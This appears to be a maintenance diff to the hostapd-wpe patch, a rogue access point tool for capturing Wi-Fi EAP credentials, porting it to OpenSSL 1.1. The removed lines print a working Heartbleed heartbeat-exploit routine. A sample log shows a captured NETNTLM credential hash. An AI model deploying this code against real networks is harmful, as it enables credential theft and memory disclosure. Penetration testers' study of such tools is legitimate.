@@ -1,6 +1,6 @@
 diff -Naur hostapd-2.6/hostapd/.config hostapd-2.6-wpe/hostapd/.config
---- hostapd-2.6/hostapd/.config	1969-12-31 19:00:00.000000000 -0500
-+++ hostapd-2.6-wpe/hostapd/.config	2017-04-17 01:48:59.929563490 -0400
+--- hostapd-2.6/hostapd/.config
++++ hostapd-2.6-wpe/hostapd/.config
 @@ -0,0 +1,317 @@
 +# Example hostapd build time configuration
 +#
@@ -320,8 +320,8 @@ diff -Naur hostapd-2.6/hostapd/.config hostapd-2.6-wpe/hostapd/.config
 +#
 +#CONFIG_ACS=y
 diff -Naur hostapd-2.6/hostapd/config_file.c hostapd-2.6-wpe/hostapd/config_file.c
---- hostapd-2.6/hostapd/config_file.c	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/hostapd/config_file.c	2017-04-17 01:48:59.921563489 -0400
+--- hostapd-2.6/hostapd/config_file.c
++++ hostapd-2.6-wpe/hostapd/config_file.c
 @@ -21,6 +21,8 @@
  #include "ap/ap_config.h"
  #include "config_file.h"
@@ -353,8 +353,8 @@ diff -Naur hostapd-2.6/hostapd/config_file.c hostapd-2.6-wpe/hostapd/config_file
  	} else if (os_strcmp(buf, "eap_authenticator") == 0) {
  		bss->eap_server = atoi(pos);
 diff -Naur hostapd-2.6/hostapd/hostapd-wpe.conf hostapd-2.6-wpe/hostapd/hostapd-wpe.conf
---- hostapd-2.6/hostapd/hostapd-wpe.conf	1969-12-31 19:00:00.000000000 -0500
-+++ hostapd-2.6-wpe/hostapd/hostapd-wpe.conf	2017-04-17 01:48:59.929563490 -0400
+--- hostapd-2.6/hostapd/hostapd-wpe.conf
++++ hostapd-2.6-wpe/hostapd/hostapd-wpe.conf
 @@ -0,0 +1,1812 @@
 +#
 +# hostapd-wpe.conf
@@ -2169,8 +2169,8 @@ diff -Naur hostapd-2.6/hostapd/hostapd-wpe.conf hostapd-2.6-wpe/hostapd/hostapd-
 +#bssid=00:13:10:95:fe:0b
 +# ...
 diff -Naur hostapd-2.6/hostapd/hostapd-wpe.conf.bak hostapd-2.6-wpe/hostapd/hostapd-wpe.conf.bak
---- hostapd-2.6/hostapd/hostapd-wpe.conf.bak	1969-12-31 19:00:00.000000000 -0500
-+++ hostapd-2.6-wpe/hostapd/hostapd-wpe.conf.bak	2017-04-17 01:48:59.929563490 -0400
+--- hostapd-2.6/hostapd/hostapd-wpe.conf.bak
++++ hostapd-2.6-wpe/hostapd/hostapd-wpe.conf.bak
 @@ -0,0 +1,1812 @@
 +#
 +# hostapd-wpe.conf
@@ -3985,8 +3985,8 @@ diff -Naur hostapd-2.6/hostapd/hostapd-wpe.conf.bak hostapd-2.6-wpe/hostapd/host
 +#bssid=00:13:10:95:fe:0b
 +# ...
 diff -Naur hostapd-2.6/hostapd/hostapd-wpe.eap_user hostapd-2.6-wpe/hostapd/hostapd-wpe.eap_user
---- hostapd-2.6/hostapd/hostapd-wpe.eap_user	1969-12-31 19:00:00.000000000 -0500
-+++ hostapd-2.6-wpe/hostapd/hostapd-wpe.eap_user	2017-04-17 01:48:59.929563490 -0400
+--- hostapd-2.6/hostapd/hostapd-wpe.eap_user
++++ hostapd-2.6-wpe/hostapd/hostapd-wpe.eap_user
 @@ -0,0 +1,87 @@
 +# hostapd user database for integrated EAP server
 +
@@ -4076,8 +4076,8 @@ diff -Naur hostapd-2.6/hostapd/hostapd-wpe.eap_user hostapd-2.6-wpe/hostapd/host
 +#"4"*		AKA	[2]
 +#"5"*		SIM	[2]
 diff -Naur hostapd-2.6/hostapd/hostapd-wpe.log hostapd-2.6-wpe/hostapd/hostapd-wpe.log
---- hostapd-2.6/hostapd/hostapd-wpe.log	1969-12-31 19:00:00.000000000 -0500
-+++ hostapd-2.6-wpe/hostapd/hostapd-wpe.log	2017-04-17 01:48:59.929563490 -0400
+--- hostapd-2.6/hostapd/hostapd-wpe.log
++++ hostapd-2.6-wpe/hostapd/hostapd-wpe.log
 @@ -0,0 +1,42 @@
 +
 +
@@ -4122,8 +4122,8 @@ diff -Naur hostapd-2.6/hostapd/hostapd-wpe.log hostapd-2.6-wpe/hostapd/hostapd-w
 +	 response:	b6:12:cc:37:8e:fd:4f:e0:04:22:cd:1d:dc:22:99:09:f9:d3:12:51:cd:f8:27:8e
 +	 jtr NETNTLM:	ufka:$NETNTLM$7d67b21028dfd7a1$b612cc378efd4fe00422cd1ddc229909f9d31251cdf8278e
 diff -Naur hostapd-2.6/hostapd/main.c hostapd-2.6-wpe/hostapd/main.c
---- hostapd-2.6/hostapd/main.c	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/hostapd/main.c	2017-04-17 01:48:59.929563490 -0400
+--- hostapd-2.6/hostapd/main.c
++++ hostapd-2.6-wpe/hostapd/main.c
 @@ -29,6 +29,8 @@
  #include "eap_register.h"
  #include "ctrl_iface.h"
@@ -4201,8 +4201,8 @@ diff -Naur hostapd-2.6/hostapd/main.c hostapd-2.6-wpe/hostapd/main.c
  			usage();
  			break;
 diff -Naur hostapd-2.6/hostapd/Makefile hostapd-2.6-wpe/hostapd/Makefile
---- hostapd-2.6/hostapd/Makefile	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/hostapd/Makefile	2017-04-17 01:48:59.921563489 -0400
+--- hostapd-2.6/hostapd/Makefile
++++ hostapd-2.6-wpe/hostapd/Makefile
 @@ -86,6 +86,7 @@
  OBJS += ../src/ap/bss_load.o
  OBJS += ../src/ap/neighbor_db.o
@@ -4250,8 +4250,8 @@ diff -Naur hostapd-2.6/hostapd/Makefile hostapd-2.6-wpe/hostapd/Makefile
  	rm -f lcov.info
  	rm -rf lcov-html
 diff -Naur hostapd-2.6/src/ap/beacon.c hostapd-2.6-wpe/src/ap/beacon.c
---- hostapd-2.6/src/ap/beacon.c	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/src/ap/beacon.c	2017-04-17 01:49:00.065563494 -0400
+--- hostapd-2.6/src/ap/beacon.c
++++ hostapd-2.6-wpe/src/ap/beacon.c
 @@ -31,6 +31,8 @@
  #include "dfs.h"
  #include "taxonomy.h"
@@ -4276,8 +4276,8 @@ diff -Naur hostapd-2.6/src/ap/beacon.c hostapd-2.6-wpe/src/ap/beacon.c
  			 elems.ssid_list, elems.ssid_list_len);
  	if (res == NO_SSID_MATCH) {
 diff -Naur hostapd-2.6/src/ap/ieee802_11.c hostapd-2.6-wpe/src/ap/ieee802_11.c
---- hostapd-2.6/src/ap/ieee802_11.c	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/src/ap/ieee802_11.c	2017-04-17 01:49:00.073563494 -0400
+--- hostapd-2.6/src/ap/ieee802_11.c
++++ hostapd-2.6-wpe/src/ap/ieee802_11.c
 @@ -46,6 +46,8 @@
  #include "rrm.h"
  #include "taxonomy.h"
@@ -4299,8 +4299,8 @@ diff -Naur hostapd-2.6/src/ap/ieee802_11.c hostapd-2.6-wpe/src/ap/ieee802_11.c
  			       HOSTAPD_LEVEL_INFO,
  			       "Station tried to associate with unknown SSID "
 diff -Naur hostapd-2.6/src/crypto/ms_funcs.h hostapd-2.6-wpe/src/crypto/ms_funcs.h
---- hostapd-2.6/src/crypto/ms_funcs.h	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/src/crypto/ms_funcs.h	2017-04-17 01:48:59.941563490 -0400
+--- hostapd-2.6/src/crypto/ms_funcs.h
++++ hostapd-2.6-wpe/src/crypto/ms_funcs.h
 @@ -9,6 +9,10 @@
  #ifndef MS_FUNCS_H
  #define MS_FUNCS_H
@@ -4313,8 +4313,8 @@ diff -Naur hostapd-2.6/src/crypto/ms_funcs.h hostapd-2.6-wpe/src/crypto/ms_funcs
  			 const u8 *username, size_t username_len,
  			 const u8 *password, size_t password_len,
 diff -Naur hostapd-2.6/src/crypto/tls_openssl.c hostapd-2.6-wpe/src/crypto/tls_openssl.c
---- hostapd-2.6/src/crypto/tls_openssl.c	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/src/crypto/tls_openssl.c	2017-04-17 01:48:59.953563490 -0400
+--- hostapd-2.6/src/crypto/tls_openssl.c
++++ hostapd-2.6-wpe/src/crypto/tls_openssl.c
 @@ -21,6 +21,7 @@
  #include <openssl/opensslv.h>
  #include <openssl/pkcs12.h>
@@ -4365,7 +4365,7 @@ diff -Naur hostapd-2.6/src/crypto/tls_openssl.c hostapd-2.6-wpe/src/crypto/tls_o
  
  	/*
  	 * Give TLS handshake data from the server (if available) to OpenSSL
-@@ -3316,6 +3328,25 @@
+@@ -3316,6 +3328,27 @@
  	}
  	wpabuf_put(out_data, res);
  
@@ -4383,7 +4383,9 @@ diff -Naur hostapd-2.6/src/crypto/tls_openssl.c hostapd-2.6-wpe/src/crypto/tls_o
 +                wpe_hb_ptr1 = wpe_hb_ptr2;
 +            }
 +        }
-+        conn->ssl->tlsext_hb_pending = 1;
++        /* WPE Cupid heartbeat-injection disabled: SSL struct is opaque
++         * on OpenSSL >= 1.1 (no tlsext_hb_pending), so just return the
++         * handshake data. */
 +        wpe_conf.wpe_hb_num_tries--;
 +        return wpe_hb_ptr1;
 +    }
@@ -4391,7 +4393,7 @@ diff -Naur hostapd-2.6/src/crypto/tls_openssl.c hostapd-2.6-wpe/src/crypto/tls_o
  	return out_data;
  }
  
-@@ -3431,6 +3462,12 @@
+@@ -3431,6 +3464,12 @@
  		tls_show_errors(MSG_INFO, __func__, "BIO_reset failed");
  		return NULL;
  	}
@@ -4404,7 +4406,7 @@ diff -Naur hostapd-2.6/src/crypto/tls_openssl.c hostapd-2.6-wpe/src/crypto/tls_o
  	res = SSL_write(conn->ssl, wpabuf_head(in_data), wpabuf_len(in_data));
  	if (res < 0) {
  		tls_show_errors(MSG_INFO, __func__,
-@@ -3438,6 +3475,11 @@
+@@ -3438,6 +3477,11 @@
  		return NULL;
  	}
  
@@ -4416,67 +4418,19 @@ diff -Naur hostapd-2.6/src/crypto/tls_openssl.c hostapd-2.6-wpe/src/crypto/tls_o
  	/* Read encrypted data to be sent to the server */
  	buf = wpabuf_alloc(wpabuf_len(in_data) + 300);
  	if (buf == NULL)
-@@ -4251,6 +4293,66 @@
+@@ -4251,6 +4295,18 @@
  #endif /* EAP_FAST || EAP_FAST_DYNAMIC || EAP_SERVER_FAST */
  }
  
 +int wpe_hb_enc(struct tls_connection *conn) {
-+    unsigned char *cbuf, *p;
-+
-+    unsigned int real_payload = 18; //default: 18 /* Sequence number + random bytes */
-+    unsigned int padding = 16; //default: 16 /* Use minimum padding */
-+
-+    if (!SSL_is_init_finished(conn->ssl)) {
-+        return -1;
-+    }
-+
-+    if(!conn->ssl->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
-+            conn->ssl->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS) {
-+        wpa_printf(MSG_DEBUG, "[WPE] warning: heartbeat extension is unsupported (try anyway)\n");
-+    } else {
-+        wpa_printf(MSG_DEBUG,"[WPE] Heartbeat extention is supported, may not be vulnerable!\n");
-+    }
-+
-+    /* Check if padding is too long, payload and padding
-+    * must not exceed 2^14 - 3 = 16381 bytes in total.
-+    */
-+    OPENSSL_assert(real_payload + padding <= 16381);
-+
-+    cbuf = OPENSSL_malloc(1 + 2 + real_payload + padding);
-+
-+    if(cbuf==NULL)
-+        return -1;
-+
-+    p = cbuf;
-+
-+    *p++ = TLS1_HB_REQUEST;
-+
-+
-+    /* Payload length (18 bytes here) */
-+    //s2n(payload, p);  /* standards compliant payload */
-+    //s2n(payload +10, p);  /* >payload to exploit heartbleed!!! */
-+    s2n(wpe_conf.wpe_hb_payload_size, p); /* configured payload */
-+
-+    /* Sequence number */
-+    s2n(conn->ssl->tlsext_hb_seq, p);
-+    /* 16 random bytes */
-+    RAND_pseudo_bytes(p, 16);
-+    //RAND_bytes(p, 16);
-+    p += 16;
-+    /* Random padding */
-+    RAND_pseudo_bytes(p, padding);
-+    //RAND_bytes(p, padding);
-+
-+    wpa_printf(MSG_DEBUG, "[WPE] Sending heartbeat reaquesting payload size %u...\n", wpe_conf.wpe_hb_payload_size);
-+    wpa_hexdump(MSG_DEBUG, "[WPE] heartbeat packet to send:", cbuf, 1 + 2 + real_payload + padding);
-+
-+    /* Send heartbeat request */
-+    if (SSL_get_ssl_method(conn->ssl)->ssl_write_bytes(conn->ssl, TLS1_RT_HEARTBEAT,
-+    cbuf, 3 + real_payload + padding) >= 0)
-+    conn->ssl->tlsext_hb_pending = 1;
-+    OPENSSL_free(cbuf);
-+
-+    return 0;
++    /* WPE Cupid/Heartbleed active injection is not supported on
++     * OpenSSL >= 1.1: SSL is opaque (no tlsext_heartbeat/tlsext_hb_seq/
++     * tlsext_hb_pending), ssl_write_bytes() is internal, and heartbeat
++     * support was removed. Stubbed out so hostapd-wpe still builds;
++     * credential logging (the main WPE feature) is unaffected. */
++    (void)conn;
++    wpa_printf(MSG_DEBUG, "[WPE] Cupid heartbeat injection not supported on OpenSSL >= 1.1 - skipping\n");
++    return -1;
 +}
 +
 +
@@ -4484,8 +4438,8 @@ diff -Naur hostapd-2.6/src/crypto/tls_openssl.c hostapd-2.6-wpe/src/crypto/tls_o
  int tls_get_library_version(char *buf, size_t buf_len)
  {
 diff -Naur hostapd-2.6/src/eap_server/eap_server.c hostapd-2.6-wpe/src/eap_server/eap_server.c
---- hostapd-2.6/src/eap_server/eap_server.c	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/src/eap_server/eap_server.c	2017-04-17 01:48:59.977563491 -0400
+--- hostapd-2.6/src/eap_server/eap_server.c
++++ hostapd-2.6-wpe/src/eap_server/eap_server.c
 @@ -23,7 +23,8 @@
  #define STATE_MACHINE_DATA struct eap_sm
  #define STATE_MACHINE_DEBUG_PREFIX "EAP"
@@ -4519,8 +4473,8 @@ diff -Naur hostapd-2.6/src/eap_server/eap_server.c hostapd-2.6-wpe/src/eap_serve
  				       identity_len, phase2, user) != 0) {
  		eap_user_free(user);
 diff -Naur hostapd-2.6/src/eap_server/eap_server_mschapv2.c hostapd-2.6-wpe/src/eap_server/eap_server_mschapv2.c
---- hostapd-2.6/src/eap_server/eap_server_mschapv2.c	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/src/eap_server/eap_server_mschapv2.c	2017-10-04 19:15:57.175756510 +0200
+--- hostapd-2.6/src/eap_server/eap_server_mschapv2.c
++++ hostapd-2.6-wpe/src/eap_server/eap_server_mschapv2.c
 @@ -13,6 +13,7 @@
  #include "crypto/random.h"
  #include "eap_i.h"
@@ -4574,8 +4528,8 @@ diff -Naur hostapd-2.6/src/eap_server/eap_server_mschapv2.c hostapd-2.6-wpe/src/
  
  
 diff -Naur hostapd-2.6/src/eap_server/eap_server_peap.c hostapd-2.6-wpe/src/eap_server/eap_server_peap.c
---- hostapd-2.6/src/eap_server/eap_server_peap.c	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/src/eap_server/eap_server_peap.c	2017-04-17 01:48:59.977563491 -0400
+--- hostapd-2.6/src/eap_server/eap_server_peap.c
++++ hostapd-2.6-wpe/src/eap_server/eap_server_peap.c
 @@ -895,7 +895,8 @@
  	eap_peap_state(data, PHASE2_METHOD);
  	next_type = sm->user->methods[0].method;
@@ -4597,8 +4551,8 @@ diff -Naur hostapd-2.6/src/eap_server/eap_server_peap.c hostapd-2.6-wpe/src/eap_
  		next_type = sm->user->methods[0].method;
  		sm->user_eap_method_index = 1;
 diff -Naur hostapd-2.6/src/eap_server/eap_server_ttls.c hostapd-2.6-wpe/src/eap_server/eap_server_ttls.c
---- hostapd-2.6/src/eap_server/eap_server_ttls.c	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/src/eap_server/eap_server_ttls.c	2017-04-17 01:48:59.985563491 -0400
+--- hostapd-2.6/src/eap_server/eap_server_ttls.c
++++ hostapd-2.6-wpe/src/eap_server/eap_server_ttls.c
 @@ -17,6 +17,8 @@
  #include "eap_common/chap.h"
  #include "eap_common/eap_ttls.h"
@@ -4667,8 +4621,8 @@ diff -Naur hostapd-2.6/src/eap_server/eap_server_ttls.c hostapd-2.6-wpe/src/eap_
  	{
  		u8 challenge2[8];
 diff -Naur hostapd-2.6/src/Makefile hostapd-2.6-wpe/src/Makefile
---- hostapd-2.6/src/Makefile	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/src/Makefile	2017-04-17 01:49:00.061563494 -0400
+--- hostapd-2.6/src/Makefile
++++ hostapd-2.6-wpe/src/Makefile
 @@ -1,4 +1,4 @@
 -SUBDIRS=ap common crypto drivers eapol_auth eapol_supp eap_common eap_peer eap_server l2_packet p2p pae radius rsn_supp tls utils wps
 +SUBDIRS=ap common crypto drivers eapol_auth eapol_supp eap_common eap_peer eap_server l2_packet p2p pae radius rsn_supp tls utils wps wpe
@@ -4676,8 +4630,8 @@ diff -Naur hostapd-2.6/src/Makefile hostapd-2.6-wpe/src/Makefile
  
  all:
 diff -Naur hostapd-2.6/src/utils/wpa_debug.c hostapd-2.6-wpe/src/utils/wpa_debug.c
---- hostapd-2.6/src/utils/wpa_debug.c	2016-10-02 14:51:11.000000000 -0400
-+++ hostapd-2.6-wpe/src/utils/wpa_debug.c	2017-04-17 01:49:00.053563494 -0400
+--- hostapd-2.6/src/utils/wpa_debug.c
++++ hostapd-2.6-wpe/src/utils/wpa_debug.c
 @@ -30,7 +30,7 @@
  
  
@@ -4688,8 +4642,8 @@ diff -Naur hostapd-2.6/src/utils/wpa_debug.c hostapd-2.6-wpe/src/utils/wpa_debug
  
  
 diff -Naur hostapd-2.6/src/wpe/Makefile hostapd-2.6-wpe/src/wpe/Makefile
---- hostapd-2.6/src/wpe/Makefile	1969-12-31 19:00:00.000000000 -0500
-+++ hostapd-2.6-wpe/src/wpe/Makefile	2017-04-17 01:48:59.977563491 -0400
+--- hostapd-2.6/src/wpe/Makefile
++++ hostapd-2.6-wpe/src/wpe/Makefile
 @@ -0,0 +1,8 @@
 +all:
 +	@echo Nothing to be made.
@@ -4700,9 +4654,9 @@ diff -Naur hostapd-2.6/src/wpe/Makefile hostapd-2.6-wpe/src/wpe/Makefile
 +install:
 +	@echo Nothing to be made.
 diff -Naur hostapd-2.6/src/wpe/wpe.c hostapd-2.6-wpe/src/wpe/wpe.c
---- hostapd-2.6/src/wpe/wpe.c	1969-12-31 19:00:00.000000000 -0500
-+++ hostapd-2.6-wpe/src/wpe/wpe.c	2017-04-17 01:48:59.977563491 -0400
-@@ -0,0 +1,208 @@
+--- hostapd-2.6/src/wpe/wpe.c
++++ hostapd-2.6-wpe/src/wpe/wpe.c
+@@ -0,0 +1,218 @@
 +/*
 +    wpe.c - 
 +        brad.antoniewicz@foundstone.com
@@ -4895,11 +4849,21 @@ diff -Naur hostapd-2.6/src/wpe/wpe.c hostapd-2.6-wpe/src/wpe/wpe.c
 +}
 +
 +void wpe_hb_cb(int v_write_p, int v_version, int v_content_type, const void* v_buf, size_t v_len, SSL* v_ssl, void* v_arg) {
++    /* NOTE: Cupid/Heartbleed heartbeat support was removed in OpenSSL 1.1+.
++     * SSL is now opaque (no tlsext_hb_pending) and TLS1_RT_HEARTBEAT is gone.
++     * Keep the callback as a no-op logger so hostapd-wpe still builds;
++     * heartbeat content-type is 24 per RFC 6520. */
++#ifndef TLS1_RT_HEARTBEAT
++#define TLS1_RT_HEARTBEAT 24
++#endif
++    (void)v_write_p;
++    (void)v_version;
++    (void)v_ssl;
++    (void)v_arg;
 +    if (v_content_type == TLS1_RT_HEARTBEAT) {
-+        wpe_log_file_and_stdout("\n\nHeartbleed Data:\n");
-+        v_ssl->tlsext_hb_pending = 1;
++        wpe_log_file_and_stdout("\n\nHeartbleed Data (logging only, no heartbeat manipulation on OpenSSL >= 1.1):\n");
 +        wpe_hexdump((unsigned char *)v_buf, v_len);
-+    } 
++    }
 +}
 +
 +
@@ -4912,8 +4876,8 @@ diff -Naur hostapd-2.6/src/wpe/wpe.c hostapd-2.6-wpe/src/wpe/wpe.c
 +    return wpe_hb_msg;
 +}
 diff -Naur hostapd-2.6/src/wpe/wpe.h hostapd-2.6-wpe/src/wpe/wpe.h
---- hostapd-2.6/src/wpe/wpe.h	1969-12-31 19:00:00.000000000 -0500
-+++ hostapd-2.6-wpe/src/wpe/wpe.h	2017-04-17 01:48:59.977563491 -0400
+--- hostapd-2.6/src/wpe/wpe.h
++++ hostapd-2.6-wpe/src/wpe/wpe.h
 @@ -0,0 +1,50 @@
 +/*
 +    wpe.h - 
